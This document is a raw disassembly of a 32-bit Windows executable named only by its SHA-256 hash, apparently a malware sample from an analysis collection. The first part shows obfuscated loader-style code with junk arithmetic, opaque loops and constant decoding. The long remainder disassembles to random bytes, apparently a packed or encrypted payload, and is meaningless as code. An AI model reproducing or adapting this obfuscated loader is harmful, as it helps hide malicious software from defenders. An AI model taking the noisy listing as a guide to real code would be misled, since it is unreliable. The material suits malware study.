
242674c52a6094903fa0eaeb3b0b528aae65cb7ba146dd69337ab50e1ac1898f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x42fa00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x42fa04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x42fa08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x42fa0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x42fa38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x42fa3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x42fa40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x42fa10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x42fa14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0xb36bc454
  40157e:	test   eax,0x7b7b7b3b
  401583:	jnp    0x401579
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [ebx+ecx*4],esp
  401596:	mov    cl,BYTE PTR [ebx+0x1d22b38a]
  40159c:	(bad)  
  40159d:	xchg   ecx,eax
  40159e:	test   eax,0x51987e88
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x205c06c4],0x1e
  40162d:	dec    ebx
  40162e:	sar    BYTE PTR ds:0xf52d0b91,cl
  401634:	js     0x401650
  401636:	jl     0x4015fb
  401638:	add    edi,DWORD PTR [ecx-0x5c]
  40163b:	test   DWORD PTR [ebx],ecx
  40163d:	jbe    0x401669
  40163f:	sbb    al,0x3e
  401641:	cmc    
  401642:	and    eax,0xa244bbc1
  401647:	(bad)  
  401648:	cli    
  401649:	xor    eax,0x769e3c3e
  40164e:	mov    al,ds:0x2d015070
  401653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401654:	mov    esi,0x2c5f93
  401659:	sub    al,al
  40165b:	dec    ebx
  40165c:	fcomp  DWORD PTR [esi-0x71]
  40165f:	adc    eax,0xfc6308b9
  401664:	stos   BYTE PTR es:[edi],al
  401665:	inc    ebx
  401666:	add    al,0x17
  401668:	xor    al,0xb5
  40166a:	fcom   QWORD PTR [edx+0x6d]
  40166d:	or     ebp,DWORD PTR [ecx]
  40166f:	dec    ebp
  401670:	aaa    
  401671:	or     BYTE PTR [ebx+0x6f1c8de4],al
  401677:	jae    0x401652
  401679:	in     al,0x6f
  40167b:	cmp    ch,BYTE PTR [ebx+0x535aa72a]
  401681:	or     ch,BYTE PTR [eax+0x7d]
  401684:	(bad)
  401687:	imul   eax,DWORD PTR ds:0xf2111989,0x36ff065c
  401691:	cwde   
  401692:	dec    edx
  401693:	in     eax,dx
  401694:	and    al,0xb4
  401696:	push   0xb6c5f718
  40169b:	jmp    0x6378:0x6cb296de
  4016a2:	push   esp
  4016a3:	int3   
  4016a4:	and    eax,0x603f5d32
  4016a9:	dec    ebx
  4016aa:	loop   0x4016ea
  4016ac:	adc    BYTE PTR [ecx-0x61],0xe7
  4016b0:	or     dh,dl
  4016b2:	outs   dx,BYTE PTR ds:[esi]
  4016b3:	cwde   
  4016b4:	fistp  QWORD PTR [edx+edx*2-0x31]
  4016b8:	dec    ebp
  4016b9:	mov    bh,0x7a
  4016bb:	xor    cl,BYTE PTR [edx+eiz*8+0x1cfe2cbc]
  4016c2:	mov    edx,fs
  4016c4:	cmp    ebx,DWORD PTR [esp+eiz*2-0x65]
  4016c8:	mov    eax,ds:0x33ae5564
  4016cd:	or     eax,0xd9e43272
  4016d2:	xor    bl,BYTE PTR [ebx-0x2bb0d604]
  4016d8:	mov    BYTE PTR [esi-0x47a22a6f],bh
  4016de:	test   al,0xfa
  4016e0:	test   eax,0xae37874
  4016e5:	add    DWORD PTR [esi+0x1c114ecf],ebp
  4016eb:	pop    ecx
  4016ec:	cwde   
  4016ed:	inc    eax
  4016ee:	add    BYTE PTR [esi],0x9b
  4016f1:	xchg   edi,eax
  4016f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f3:	and    eax,0xb6d560a0
  4016f8:	sahf   
  4016f9:	pop    ebx
  4016fa:	inc    edi
  4016fb:	adc    al,0xd3
  4016fd:	inc    eax
  4016fe:	imul   eax,DWORD PTR [ebx-0x105f3f70],0x7a
  401705:	add    BYTE PTR [ebp-0x76c3c522],bh
  40170b:	inc    edx
  40170c:	aam    0xde
  40170e:	sbb    BYTE PTR [ebx],0x5a
  401711:	or     ch,0x16
  401714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401715:	jbe    0x40178c
  401717:	adc    ecx,ebp
  401719:	add    DWORD PTR [eax-0x59],esi
  40171c:	gs (bad) 
  401720:	jp     0x401707
  401722:	xchg   esi,eax
  401723:	(bad)  
  401724:	enter  0xaee5,0x2c
  401728:	push   edx
  401729:	inc    esi
  40172a:	inc    eax
  40172b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40172c:	pop    es
  40172d:	pushw  ds
  40172f:	lock inc esp
  401731:	retf   0x97cb
  401734:	rcl    BYTE PTR [ecx-0x3b313b19],cl
  40173a:	sbb    dh,cl
  40173c:	sub    al,ah
  40173e:	das    
  40173f:	out    0xb6,al
  401741:	xchg   BYTE PTR [esi-0x65],ah
  401744:	push   ecx
  401745:	popf   
  401746:	sbb    ah,BYTE PTR [esi+0x45]
  401749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40174a:	pop    esp
  40174b:	sbb    DWORD PTR [ebx+0x2c],esi
  40174e:	mov    ch,0x92
  401750:	push   esp
  401751:	mov    eax,ds:0xb800ef09
  401756:	lds    esp,FWORD PTR ds:0xbf48b353
  40175c:	in     al,0x1
  40175e:	jl     0x401735
  401760:	sbb    eax,0x83e95105
  401765:	addr16 push ss
  401767:	mov    eax,ds:0xf8302aee
  40176c:	adc    eax,0x6ce0482c
  401771:	and    DWORD PTR [eax],ebx
  401773:	dec    ebp
  401774:	retf   
  401775:	sbb    DWORD PTR [edx],0x2f
  401778:	repz push ss
  40177a:	jg     0x401729
  40177c:	sbb    eax,0x40de49f3
  401781:	mov    DWORD PTR [ebx+0x2af1d36],ecx
  401787:	shr    DWORD PTR [esi+ecx*2+0x36],cl
  40178b:	repz pop ecx
  40178d:	outs   dx,BYTE PTR ds:[esi]
  40178e:	jmp    0x4017d3
  401790:	jge    0x4017b2
  401792:	push   ebx
  401793:	sbb    al,0xa0
  401795:	cmp    esi,DWORD PTR [edi+0x4b]
  401798:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40179a:	or     eax,0xac000bd4
  40179f:	xchg   ebx,eax
  4017a0:	pop    esp
  4017a1:	inc    cl
  4017a3:	mov    ds,WORD PTR [ebp-0x4fecb023]
  4017a9:	xor    BYTE PTR [edx-0x44],bh
  4017ac:	xor    ecx,DWORD PTR [edx]
  4017ae:	inc    ebp
  4017af:	fbstp  TBYTE PTR [edi-0x2f07fbd9]
  4017b5:	stc    
  4017b6:	out    0x1,eax
  4017b8:	imul   edx,DWORD PTR ds:0x64b323fd,0xffffffaf
  4017bf:	inc    esi
  4017c0:	xor    eax,0x3f28f026
  4017c5:	and    al,0x68
  4017c7:	mov    ds,ebx
  4017c9:	ror    DWORD PTR [eax-0x5b602672],cl
  4017cf:	xchg   ebp,eax
  4017d0:	pushf  
  4017d1:	xor    edx,DWORD PTR [ebx+0x62]
  4017d4:	nop
  4017d5:	scas   al,BYTE PTR es:[edi]
  4017d6:	cs leave 
  4017d8:	mov    eax,ds:0x15fc2f56
  4017dd:	xor    al,0x4c
  4017df:	inc    BYTE PTR [esi-0xe8c6351]
  4017e5:	and    bl,dl
  4017e7:	sti    
  4017e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017e9:	rcl    BYTE PTR [eax],0x16
  4017ec:	adc    DWORD PTR [edx],edi
  4017ee:	loope  0x4017c4
  4017f0:	mov    esi,esp
  4017f2:	add    edi,0x3a
  4017f5:	or     ebp,ebp
  4017f7:	int3   
  4017f8:	jnp    0x40177e
  4017fa:	xor    eax,0x1c0ab36d
  4017ff:	out    0x60,al
  401801:	je     0x40186b
  401803:	mov    ds:0x1e29f379,eax
  401808:	lods   eax,DWORD PTR ds:[esi]
  401809:	xchg   bh,dl
  40180b:	stos   BYTE PTR es:[edi],al
  40180c:	inc    ecx
  40180d:	ret    
  40180e:	pop    eax
  40180f:	jno    0x40181e
  401811:	cmp    DWORD PTR [edi+0x3d9b44a6],eax
  401817:	mov    ch,0x30
  401819:	stos   BYTE PTR es:[edi],al
  40181a:	or     BYTE PTR [edi],dl
  40181c:	imul   ecx,DWORD PTR [ebx+0x4999aea1],0x5
  401823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401824:	aaa    
  401825:	dec    esi
  401826:	sbb    esi,edi
  401828:	push   edi
  401829:	add    DWORD PTR [ecx],edx
  40182b:	sbb    edx,esp
  40182d:	sbb    BYTE PTR [ebp-0x56e91089],ah
  401833:	pop    ebp
  401834:	mov    dh,0xe8
  401836:	icebp  
  401837:	je     0x40187e
  401839:	(bad)  
  40183a:	loopne 0x401888
  40183c:	and    DWORD PTR [ebx-0x35e958a9],0x13cc81e6
  401846:	and    ecx,DWORD PTR [edx-0xc0db01]
  40184c:	fs mov bh,0xa4
  40184f:	push   cs
  401850:	jle    0x401834
  401852:	add    eax,0x27947a18
  401857:	(bad)  
  401858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401859:	daa    
  40185a:	push   cs
  40185b:	mov    ebx,0x439969
  401860:	pop    esp
  401861:	fs pop ebx
  401863:	xchg   BYTE PTR [edi+0x3],ah
  401866:	cmp    edi,DWORD PTR [esi]
  401868:	sti    
  401869:	xchg   esp,eax
  40186a:	jbe    0x401845
  40186c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40186d:	mov    esp,0x21adcd3b
  401872:	daa    
  401873:	adc    eax,0xc980d1e8
  401878:	pop    es
  401879:	xor    DWORD PTR [ebp+0x37],eax
  40187c:	jl     0x4018ad
  40187e:	inc    esp
  40187f:	or     eax,0x1ec41ef
  401884:	stos   BYTE PTR es:[edi],al
  401885:	add    DWORD PTR [ebp+eiz*4+0x531b205e],0x9bbfa048
  401890:	or     al,0x8b
  401892:	xchg   ebp,eax
  401893:	fisttp WORD PTR [esi+0x25]
  401896:	cmc    
  401897:	test   DWORD PTR [eax+0x2d939fc9],ebp
  40189d:	add    al,0xb4
  40189f:	jge    0x4018cd
  4018a1:	pushf  
  4018a2:	ja     0x401895
  4018a4:	xor    DWORD PTR es:[ecx-0x5db86b59],ebp
  4018ab:	imul   esi,DWORD PTR [ecx],0x69
  4018ae:	enter  0x9640,0xb9
  4018b2:	ret    0x3340
  4018b5:	stos   DWORD PTR es:[edi],eax
  4018b6:	addr16 test al,0x47
  4018b9:	lock jnp 0x4018d8
  4018bc:	es sub al,0x74
  4018bf:	sbb    al,0xeb
  4018c1:	xlat   BYTE PTR ds:[ebx]
  4018c2:	xor    ch,BYTE PTR [edi-0x1d422719]
  4018c8:	pop    es
  4018c9:	mov    ecx,0x76ecc108
  4018ce:	mov    cl,0x5b
  4018d0:	fcom   DWORD PTR [edx-0x29]
  4018d3:	xor    eax,0x54324867
  4018d8:	inc    eax
  4018d9:	hlt    
  4018da:	(bad)  
  4018db:	loope  0x40191b
  4018dd:	mov    edi,0x6e1bd881
  4018e2:	sahf   
  4018e3:	retf   0xff8f
  4018e6:	add    edi,ebx
  4018e8:	mov    fs,edi
  4018ea:	out    dx,eax
  4018eb:	xor    esp,DWORD PTR ds:0xa0ea49b8
  4018f1:	loope  0x40188c
  4018f3:	bound  edi,QWORD PTR [ebp-0x4b9d9e99]
  4018f9:	cs jo  0x401884
  4018fc:	pusha  
  4018fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018fe:	ins    DWORD PTR es:[edi],dx
  4018ff:	(bad)  
  401900:	mov    edx,0x6b8ff605
  401905:	push   eax
  401906:	sbb    al,0x29
  401908:	inc    edx
  401909:	retf   0x5531
  40190c:	jnp    0x401919
  40190e:	stos   BYTE PTR es:[edi],al
  40190f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401910:	sbb    al,0x8d
  401912:	outs   dx,BYTE PTR ds:[esi]
  401913:	test   DWORD PTR [ecx],0xa2763032
  401919:	mov    dh,0xba
  40191b:	lods   al,BYTE PTR ds:[esi]
  40191c:	js     0x401972
  40191e:	inc    edx
  40191f:	pop    esp
  401920:	nop
  401921:	fwait
  401922:	xor    al,BYTE PTR [edx-0x7803072c]
  401928:	mov    ds:0xdd6bd2cb,eax
  40192d:	adc    ebx,DWORD PTR [ecx+ebx*1]
  401930:	lock sub eax,0xde18c864
  401936:	stos   BYTE PTR es:[edi],al
  401937:	cdq    
  401938:	inc    ecx
  401939:	pop    ds
  40193a:	mov    esp,0xc417b148
  40193f:	push   cs
  401940:	cwde   
  401941:	sbb    eax,0xd2b50d42
  401946:	jmp    0x32d2:0x2951b895
  40194d:	leave  
  40194e:	imul   edi,DWORD PTR [eax+edx*1-0x2623ac85],0xc8557b5
  401959:	out    0x53,eax
  40195b:	ficomp WORD PTR [esi]
  40195d:	adc    DWORD PTR [eax+0x1e],edx
  401960:	sbb    bh,BYTE PTR [edi]
  401962:	push   esp
  401963:	xor    ah,dl
  401965:	xchg   ebx,eax
  401966:	gs pop ss
  401968:	shl    bh,0xf8
  40196b:	icebp  
  40196c:	dec    esi
  40196d:	inc    esi
  40196e:	test   ebx,edi
  401970:	rcr    DWORD PTR [ebp-0x5875299a],0x6c
  401977:	stos   BYTE PTR es:[edi],al
  401978:	imul   eax,esp,0x5b4ea3b6
  40197e:	imul   esp,ebp,0x5fdd975a
  401984:	retf   0xb225
  401987:	ret    0x1462
  40198a:	nop
  40198b:	inc    edi
  40198c:	xchg   esi,eax
  40198d:	or     al,0x13
  40198f:	leave  
  401990:	mov    BYTE PTR [ebx],al
  401992:	adc    BYTE PTR [eax-0x5e79aa51],dl
  401998:	and    BYTE PTR [eax],bl
  40199a:	shl    BYTE PTR [esi],1
  40199c:	xor    eax,0x6b7a074d
  4019a1:	fxch   st(4)
  4019a3:	popa   
  4019a4:	imul   ebp,DWORD PTR [ebx],0x516d1bd9
  4019aa:	push   ecx
  4019ab:	lahf   
  4019ac:	jmp    0x40198d
  4019ae:	and    DWORD PTR [edx+0x12],0x8
  4019b2:	jmp    0x939a8c71
  4019b7:	pop    edi
  4019b8:	ror    ah,1
  4019ba:	jb     0x401974
  4019bc:	imul   eax,ecx,0xc2198a60
  4019c2:	cld    
  4019c3:	popf   
  4019c4:	or     BYTE PTR [ecx],bh
  4019c6:	jb     0x401a2e
  4019c8:	sub    dh,dh
  4019ca:	pop    ds
  4019cb:	jl     0x401966
  4019cd:	sbb    DWORD PTR [ecx+0x6],0x31
  4019d1:	mov    edx,0xe0086672
  4019d6:	(bad)  
  4019d7:	clc    
  4019d8:	push   esp
  4019d9:	outs   dx,BYTE PTR ds:[esi]
  4019da:	cmp    al,0x37
  4019dc:	imul   BYTE PTR [eax+0x38d10285]
  4019e2:	push   0xffffffb4
  4019e4:	mov    esi,0xe8ce71fd
  4019e9:	stos   DWORD PTR es:[edi],eax
  4019ea:	cmp    BYTE PTR [edi],cl
  4019ec:	mov    ch,BYTE PTR [ebp+0x27]
  4019ef:	cld    
  4019f0:	js     0x401a5f
  4019f2:	add    eax,0xcbd40daf
  4019f7:	aad    0x3
  4019f9:	mov    cs,ebp
  4019fb:	push   eax
  4019fc:	add    al,0x2c
  4019fe:	mov    ebx,0x963508cd
  401a03:	mov    esi,0xaeb6548b
  401a08:	pop    edx
  401a09:	and    BYTE PTR [edi+eax*2],ch
